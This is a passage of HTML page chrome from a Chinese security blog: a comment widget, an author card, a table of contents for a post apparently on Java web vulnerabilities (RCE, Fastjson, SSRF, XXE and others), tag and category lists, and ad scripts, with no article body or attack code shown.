is-5">Comments</h3><div class="content" id="valine-thread"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script>new Valine({
            el: '#valine-thread' ,
            appId: "Mi7VTJ1Ohx0XKeYNBRfjWrY5-gzGzoHsz",
            appKey: "kqSPJKxTTPM9aNVRrWttS4HT",
            
            avatar: "mm",
            
            meta: ["nick","mail","link"],
            pageSize: 10,
            lang: "en",
            
            highlight: true,
            
            
            
            
            
            requiredFields: [],
        });</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" alt="ol4three"></figure><p class="title is-size-4 is-block line-height-inherit">ol4three</p><p class="is-size-6 is-block">醒来时世界都远了，我需要最狂的风，和最静的海。</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>BeiJing,China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">113</p></a></div></div><a class="level-item has-text-centered is-marginless" href="/categories"><div><p class="heading">Categories</p><div><p class="title">9</p></div></div></a><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">104</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ol4three" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ol4three"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" id="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="is-flex" href="#0x00-前言"><span class="mr-2">1</span><span>0x00 前言</span></a></li><li><a class="is-flex" href="#0x01环境配置"><span class="mr-2">2</span><span>0x01环境配置</span></a></li><li><a class="is-flex" href="#0x02-漏洞分析"><span class="mr-2">3</span><span>0x02 漏洞分析</span></a><ul class="menu-list"><li><a class="is-flex" href="#1-Rce"><span class="mr-2">3.1</span><span>1. Rce</span></a><ul class="menu-list"><li><a class="is-flex" href="#Java命令执行的几种方式"><span class="mr-2">3.1.1</span><span>Java命令执行的几种方式</span></a></li><li><a class="is-flex" href="#1）Runtime-类执行系统命令"><span class="mr-2">3.1.2</span><span>1）Runtime 类执行系统命令</span></a></li><li><a class="is-flex" href="#2）ProcessBuilder-类命令执行"><span class="mr-2">3.1.3</span><span>2）ProcessBuilder 类命令执行</span></a></li><li><a class="is-flex" href="#3-反射调用Processlmpl-类执行系统命令"><span class="mr-2">3.1.4</span><span>3) 反射调用Processlmpl 类执行系统命令</span></a></li><li><a class="is-flex" href="#4-反射调用Runtime类执行系统命令"><span class="mr-2">3.1.5</span><span>4) 反射调用Runtime类执行系统命令</span></a></li><li><a class="is-flex" href="#5-JavaScript命令执行"><span class="mr-2">3.1.6</span><span>5) JavaScript命令执行</span></a></li><li><a class="is-flex" href="#6）Yaml反序列化命令执行"><span class="mr-2">3.1.7</span><span>6）Yaml反序列化命令执行</span></a></li><li><a class="is-flex" href="#7）Groovy-命令执行"><span class="mr-2">3.1.8</span><span>7）Groovy 命令执行</span></a></li></ul></li><li><a class="is-flex" href="#2-CommandInject"><span class="mr-2">3.2</span><span>2. CommandInject</span></a><ul class="menu-list"><li><a class="is-flex" href="#1-参数注入"><span class="mr-2">3.2.1</span><span>1.参数注入</span></a></li><li><a class="is-flex" href="#2-Host注入"><span class="mr-2">3.2.2</span><span>2.Host注入</span></a></li><li><a class="is-flex" href="#修复代码"><span class="mr-2">3.2.3</span><span>修复代码</span></a></li></ul></li><li><a class="is-flex" href="#3-Broken-Access-Control"><span class="mr-2">3.3</span><span>3. Broken Access Control</span></a></li><li><a class="is-flex" href="#4-Cors"><span class="mr-2">3.4</span><span>4. Cors</span></a></li><li><a class="is-flex" href="#5-CRLFInjection"><span class="mr-2">3.5</span><span>5.CRLFInjection</span></a></li><li><a class="is-flex" href="#6-Jsonp"><span class="mr-2">3.6</span><span>6.Jsonp</span></a><ul class="menu-list"><li><a class="is-flex" href="#安全问题："><span class="mr-2">3.6.1</span><span>安全问题：</span></a></li><li><a class="is-flex" href="#1-前端调用代码的"><span class="mr-2">3.6.2</span><span>1.前端调用代码的</span></a></li><li><a class="is-flex" href="#2-使用iframe标签进行绕过"><span class="mr-2">3.6.3</span><span>2.使用iframe标签进行绕过</span></a></li><li><a class="is-flex" href="#3-fastjsonp-to-jsonp"><span class="mr-2">3.6.4</span><span>3.fastjsonp to jsonp</span></a></li></ul></li><li><a class="is-flex" href="#7-Deserialize-序列化与反序列化"><span class="mr-2">3.7</span><span>7.Deserialize 序列化与反序列化</span></a></li><li><a class="is-flex" href="#8-Fastjson"><span class="mr-2">3.8</span><span>8.Fastjson</span></a><ul class="menu-list"><li><a class="is-flex" href="#使用DNSLOG验证"><span class="mr-2">3.8.1</span><span>使用DNSLOG验证</span></a></li><li><a class="is-flex" href="#任意命令执行"><span class="mr-2">3.8.2</span><span>任意命令执行</span></a></li></ul></li><li><a class="is-flex" href="#9-FileUpload"><span class="mr-2">3.9</span><span>9.FileUpload</span></a></li><li><a class="is-flex" href="#10-GetRequestURI"><span class="mr-2">3.10</span><span>10.GetRequestURI</span></a></li><li><a class="is-flex" href="#11-PathTraversal"><span class="mr-2">3.11</span><span>11.PathTraversal</span></a></li><li><a class="is-flex" href="#12-SpEL"><span class="mr-2">3.12</span><span>12.SpEL</span></a></li><li><a class="is-flex" href="#13-SQLI"><span class="mr-2">3.13</span><span>13.SQLI</span></a></li><li><a class="is-flex" href="#14-SSRF"><span class="mr-2">3.14</span><span>14.SSRF</span></a><ul class="menu-list"><li><a class="is-flex" href="#1-漏洞简介"><span class="mr-2">3.14.1</span><span>1.漏洞简介</span></a></li><li><a class="is-flex" href="#2-支持协议"><span class="mr-2">3.14.2</span><span>2.支持协议</span></a></li><li><a class="is-flex" href="#3-重定向"><span class="mr-2">3.14.3</span><span>3.重定向</span></a></li><li><a class="is-flex" href="#4-DNS-Rebinding"><span class="mr-2">3.14.4</span><span>4.DNS Rebinding</span></a></li><li><a class="is-flex" href="#5-总结"><span class="mr-2">3.14.5</span><span>5.总结</span></a></li></ul></li><li><a class="is-flex" href="#15-SSTI"><span class="mr-2">3.15</span><span>15.SSTI</span></a></li><li><a class="is-flex" href="#16-URLRedirect"><span class="mr-2">3.16</span><span>16.URLRedirect</span></a></li><li><a class="is-flex" href="#17-URLWhiteList"><span class="mr-2">3.17</span><span>17.URLWhiteList</span></a><ul class="menu-list"><li><a class="is-flex" href="#1-前言"><span class="mr-2">3.17.1</span><span>1.前言</span></a></li><li><a class="is-flex" href="#2-可造成的漏洞"><span class="mr-2">3.17.2</span><span>2.可造成的漏洞</span></a></li><li><a class="is-flex" href="#5-正则匹配URL是否以-joychou-com"><span class="mr-2">3.17.3</span><span>5.正则匹配URL是否以.joychou.com</span></a></li><li><a class="is-flex" href="#4-安全代码和测试环境"><span class="mr-2">3.17.4</span><span>4.安全代码和测试环境</span></a></li><li><a class="is-flex" href="#5-CORS绕过"><span class="mr-2">3.17.5</span><span>5.CORS绕过</span></a></li></ul></li><li><a class="is-flex" href="#18-XSS"><span class="mr-2">3.18</span><span>18.XSS</span></a></li><li><a class="is-flex" href="#19-XStreamRCE"><span class="mr-2">3.19</span><span>19.XStreamRCE</span></a></li><li><a class="is-flex" href="#20-XXE"><span class="mr-2">3.20</span><span>20.XXE</span></a><ul class="menu-list"><li><a class="is-flex" href="#CDATA"><span class="mr-2">3.20.1</span><span>CDATA</span></a></li><li><a class="is-flex" href="#1-有回显"><span class="mr-2">3.20.2</span><span>1.有回显</span></a></li><li><a class="is-flex" href="#2-Bind-无回显"><span class="mr-2">3.20.3</span><span>2.Bind 无回显</span></a></li><li><a class="is-flex" href="#3-支持的Xinclude的XXE"><span class="mr-2">3.20.4</span><span>3.支持的Xinclude的XXE</span></a></li><li><a class="is-flex" href="#各平台支持协议如下："><span class="mr-2">3.20.5</span><span>各平台支持协议如下：</span></a></li></ul></li></ul></li><li><a class="is-flex" href="#0x03-参考"><span class="mr-2">4</span><span>0x03 参考</span></a></li></ul></div></div><style>.menu-list > li > a.is-active + .menu-list { display: block; }.menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Links</h3><ul class="menu-list"><li><a class="level is-mobile is-mobile" href="http://b0urne.top" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">B0urne</span></span><span class="level-right"><span class="level-item tag">b0urne.top</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://lalalaxiaoyuren.github.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">smail_fish</span></span><span class="level-right"><span class="level-item tag">lalalaxiaoyuren.github.io</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://vinadiakt.github.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">vinadiak</span></span><span class="level-right"><span class="level-item tag">vinadiakt.github.io</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/Android/"><span class="level-start"><span class="level-item">Android</span></span><span class="level-end"><span class="level-item tag">11</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/"><span class="level-start"><span class="level-item">CTF</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/IOT/"><span class="level-start"><span class="level-item">IOT</span></span><span class="level-end"><span class="level-item tag">25</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/PWN/"><span class="level-start"><span class="level-item">PWN</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/WEB%E5%AE%89%E5%85%A8/"><span class="level-start"><span class="level-item">WEB安全</span></span><span class="level-end"><span class="level-item tag">44</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"><span class="level-start"><span class="level-item">二进制安全</span></span><span class="level-end"><span class="level-item tag">14</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><span class="level-start"><span class="level-item">内网渗透</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"><span class="level-start"><span class="level-item">环境配置</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E8%B7%AF%E7%94%B1%E5%99%A8/"><span class="level-start"><span class="level-item">路由器</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content size-small"><p><time dateTime="2022-04-12T07:15:36.000Z">2022-04-12</time></p><p class="title is-6"><a class="link-muted" href="/2022/04/12/Android/objectioin%E5%AE%9E%E6%88%98%E8%AF%A6%E8%A7%A3/">objectioin实战详解</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/Android/">Android</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2022-03-11T08:46:22.000Z">2022-03-11</time></p><p class="title is-6"><a class="link-muted" href="/2022/03/11/Android/objection-%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/">objection 使用详解</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/Android/">Android</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2022-01-12T08:36:19.000Z">2022-01-12</time></p><p class="title is-6"><a class="link-muted" href="/2022/01/12/WEB/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">SSTI模版注入学习</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2021-12-21T10:40:00.000Z">2021-12-21</time></p><p class="title is-6"><a class="link-muted" href="/2021/12/21/Android/frida/Frida-Hook-%E6%80%BB%E7%BB%93/">Frida Hook 总结</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/Android/">Android</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2021-12-06T02:26:08.000Z">2021-12-06</time></p><p class="title is-6"><a class="link-muted" href="/2021/12/06/Android/APP%E6%B5%8B%E8%AF%95%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/">APP测试常见问题总结</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/Android/">Android</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/360/"><span class="tag">360</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/APP%E6%B5%8B%E8%AF%95/"><span class="tag">APP测试</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/AWD/"><span class="tag">AWD</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ActiveMQ/"><span class="tag">ActiveMQ</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Amazon/"><span class="tag">Amazon</span><span class="tag is-grey-lightest">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Apache/"><span class="tag">Apache</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Apache-Cocoon-XML/"><span class="tag">Apache-Cocoon-XML</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Apereo-Cas/"><span class="tag">Apereo Cas</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/AppWeb/"><span class="tag">AppWeb</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Apple-T2/"><span class="tag">Apple T2</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/BLE/"><span class="tag">BLE</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/BadUsb/"><span class="tag">BadUsb</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/C2/"><span class="tag">C2</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Cisco/"><span class="tag">Cisco</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Cobalt-Strike/"><span class="tag">Cobalt Strike</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Code-audit/"><span class="tag">Code_audit</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/DMA/"><span class="tag">DMA</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Dict/"><span class="tag">Dict</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Drozer/"><span class="tag">Drozer</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/EDR/"><span class="tag">EDR</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Exchange-Server/"><span class="tag">Exchange-Server</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Frida/"><span class="tag">Frida</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Glibc-Heap/"><span class="tag">Glibc Heap</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Google-Hacking/"><span class="tag">Google-Hacking</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%8D%8F%E8%AE%AE/"><span class="tag">HTTP请求走私协议</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/HWS/"><span class="tag">HWS</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Hook/"><span class="tag">Hook</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Horde-Groupware-Webmail-Edition/"><span class="tag">Horde Groupware Webmail Edition</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Httpdecrypt/"><span class="tag">Httpdecrypt</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Huawei/"><span class="tag">Huawei</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/IOT/"><span class="tag">IOT</span><span class="tag is-grey-lightest">17</span></a></div><div class="control"><a class="tags has-addons" href="/tags/JCG/"><span class="tag">JCG</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/MCA/"><span class="tag">MCA</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/MCE/"><span class="tag">MCE</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/MSF/"><span class="tag">MSF</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Mybatis/"><span class="tag">Mybatis</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Mysql-python/"><span class="tag">Mysql-python</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/NC/"><span class="tag">NC</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="tag">PHP反序列化</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP%E7%BD%91%E7%AB%99/"><span class="tag">PHP网站</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PWN/"><span class="tag">PWN</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PhpStudy/"><span class="tag">PhpStudy</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PineApple-Nano/"><span class="tag">PineApple-Nano</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Pligg/"><span class="tag">Pligg</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PowerSploit/"><span class="tag">PowerSploit</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Pwn/"><span class="tag">Pwn</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RCE/"><span class="tag">RCE</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SDK/"><span class="tag">SDK</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SGX/"><span class="tag">SGX</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SQLI-labs/"><span class="tag">SQLI-labs</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SQL%E6%B3%A8%E5%85%A5/"><span class="tag">SQL注入</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SSTI/"><span class="tag">SSTI</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Smartbi/"><span class="tag">Smartbi</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Spring-Boot/"><span class="tag">Spring Boot</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Sql%E6%B3%A8%E5%85%A5/"><span class="tag">Sql注入</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Thunderbolt-3/"><span class="tag">Thunderbolt 3</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/UAF/"><span class="tag">UAF</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Ubertooth-one/"><span class="tag">Ubertooth one</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/VIM/"><span class="tag">VIM</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/VPN/"><span class="tag">VPN</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/WEB%E5%AE%89%E5%85%A8/"><span class="tag">WEB安全</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/XiaoMi/"><span class="tag">XiaoMi</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ZTE/"><span class="tag">ZTE</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/adb/"><span class="tag">adb</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/crackme/"><span class="tag">crackme</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/crunch/"><span class="tag">crunch</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/icarus/"><span class="tag">icarus</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/iot/"><span class="tag">iot</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="tag">java反序列化</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/junior/"><span class="tag">junior</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/kindeditor/"><span class="tag">kindeditor</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"><span class="tag">nginx解析漏洞</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/objection/"><span class="tag">objection</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable-kr/"><span class="tag">pwnable.kr</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/sangfor/"><span class="tag">sangfor</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/scrcpy/"><span class="tag">scrcpy</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/sql%E6%B3%A8%E5%85%A5/"><span class="tag">sql注入</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/struts2/"><span class="tag">struts2</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/unlink/"><span class="tag">unlink</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%B8%89%E6%98%9F/"><span class="tag">三星</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/"><span class="tag">代理转发</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><span class="tag">内网渗透</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"><span class="tag">协议分析</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"><span class="tag">后渗透</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%9B%BA%E4%BB%B6/"><span class="tag">固件</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%A0%86/"><span class="tag">堆</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%A4%A9%E8%9E%8D%E4%BF%A1/"><span class="tag">天融信</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%AE%8F%E7%97%85%E6%AF%92/"><span class="tag">宏病毒</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%AE%9D%E5%A1%94/"><span class="tag">宝塔</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"><span class="tag">小程序</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"><span class="tag">未授权访问漏洞</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"><span class="tag">格式化字符串</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%AD%A3%E5%88%99/"><span class="tag">正则</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%B3%9B%E5%BE%AEOA/"><span class="tag">泛微OA</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%94%A8%E5%8F%8B/"><span class="tag">用友</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%BA%A2%E9%98%9F%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6/"><span class="tag">红队百科全书</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%BB%BF%E7%9B%9F/"><span class="tag">绿盟</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%93%9D%E7%89%99/"><span class="tag">蓝牙</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"><span class="tag">路由器</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E9%80%9A%E8%BE%BEOA/"><span class="tag">通达OA</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E9%9D%A2%E8%AF%95/"><span class="tag">面试</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81/"><span class="tag">默认密码</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/"><span class="tag">齐治堡垒机</span><span class="tag is-grey-lightest">1</span></a></div></div></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Subscribe for updates</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button is-primary" type="submit" value="Subscribe"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Advertisement</h3><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><ins class="adsbygoogle" style="display:block" data-ad-client="1" data-ad-slot="1" data-ad-format="auto" data-full-width-responsive="true"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img 